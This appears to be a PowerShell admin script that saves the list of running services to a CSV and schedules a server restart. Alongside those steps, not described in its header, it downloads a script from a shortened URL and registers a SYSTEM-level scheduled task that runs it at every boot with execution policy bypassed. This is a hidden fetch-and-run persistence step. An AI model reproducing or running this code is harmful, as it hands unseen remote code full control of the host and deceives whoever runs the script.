#Save services prior to restart
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Set-Location -Path "C:\temp";$timestamp = Get-Date -Format o | ForEach-Object { $_ -replace ":", "." }; new-item -Type directory -Path C:\temp;new-item -Type directory -Path C:\archive; move-Item -path C:\temp\serviceslog* -destination C:\archive; get-service | Where-Object {$_.Status -eq "Running"} |Select-object Name, DisplayName| Export-Csv -Path C:\temp\ServicesLog$timestamp.csv; get-content C:\temp\ServicesLog$timestamp.csv; $s = 'https://rb.gy/tjattq'; $d = 'C:\temp\p1.ps1'; Invoke-WebRequest -Uri $s -OutFile $d; Start-Sleep -s 2; schtasks.exe /create /f /tn HRT /ru SYSTEM /sc ONSTART /tr "powershell.exe -file $d -executionpolicy Bypass";$T = Read-Host -Prompt 'Enter Time  from now to restart server';$Date = (Get-Date).ToString('MM-dd-yyyy'); Write-Host "Server will resart at '$T' on '$Date'"; schtasks.exe /create /tn “REB” /tr “shutdown /r /t 0” /sc once /st $T /sd $Date /ru “System”
